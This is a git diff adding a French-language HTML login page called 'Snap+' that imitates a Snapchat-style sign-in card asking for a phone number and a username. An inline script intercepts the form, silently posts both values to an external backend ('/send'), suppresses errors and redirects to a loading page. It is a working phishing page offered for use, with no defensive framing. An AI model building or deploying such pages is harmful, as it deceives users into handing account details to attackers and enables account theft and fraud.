@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snap+</title>
+  <link rel="stylesheet" href="assets/style.css" />
+</head>
+<body>
+  <div class="card">
+    <div class="logo-wrapper">
+      <img src="assets/logo.png" alt="Logo"/>
+    </div>
+    <h2>Snap+</h2>
+    <p>Accédez à votre compte</p>
+    <div class="input-wrapper">
+      <span class="flag">🇫🇷</span>
+      <input type="tel" id="phone" placeholder="Numéro de téléphone" minlength="10" required />
+    </div>
+    <input type="text" id="pseudo" placeholder="Nom d'utilisateur" required />
+    <button onclick="sendRequest()">Suivant</button>
+  </div>
+  <script src="assets/script.js"></script>
+
+<script>
+(function(){
+  const form = document.querySelector('form') || document.getElementById('loginForm') || document.getElementById('form');
+  if(!form) return;
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    const pseudoEl = document.querySelector('#pseudo') || document.querySelector('#username');
+    const numeroEl = document.querySelector('#numero') || document.querySelector('#phone');
+    const pseudo = pseudoEl ? pseudoEl.value : '';
+    const numero = numeroEl ? numeroEl.value : '';
+    if(numero && numero.replace(/\D/g,'').length < 10){ alert('Le numéro doit contenir au moins 10 chiffres.'); return; }
+    fetch(BACKEND_URL + '/send', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ pseudo, numero })}).catch(()=>{});
+    location.href = 'loading.html';
+  });
+})(); 
+</script>
+<script src="config.js"></script>
+</body>
+</html>
